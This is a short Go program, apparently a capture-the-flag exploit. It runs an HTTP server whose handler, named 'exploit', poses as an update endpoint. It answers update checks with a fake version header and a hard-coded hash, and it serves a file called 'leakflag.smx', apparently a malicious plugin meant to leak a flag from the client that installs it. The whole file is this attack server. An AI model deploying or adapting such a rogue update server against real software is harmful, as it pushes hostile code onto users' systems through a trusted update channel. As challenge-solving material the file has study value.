package main

import (
        "fmt"
        "io/ioutil"
        "net/http"
)

func exploit(w http.ResponseWriter, req *http.Request) {
        if _, ok := req.URL.Query()["update"]; ok {
                fmt.Fprintf(w, "<header>1")
                return
        }
        if _, ok := req.URL.Query()["file"]; ok {
                out, _ := ioutil.ReadFile("leakflag.smx")
                w.Write(out)
                return
        }

        ip := req.URL.Query().Get("ip")
        // server connecting
        if len(ip) == 0 {
        fmt.Fprintf(w, "<header>9195b684b889075bec21f23b500efc75dcd45aed")  // todo better calc hash
                return
        }
}


func main() {
        http.HandleFunc("/", exploit)
        http.ListenAndServe(":80", nil)
}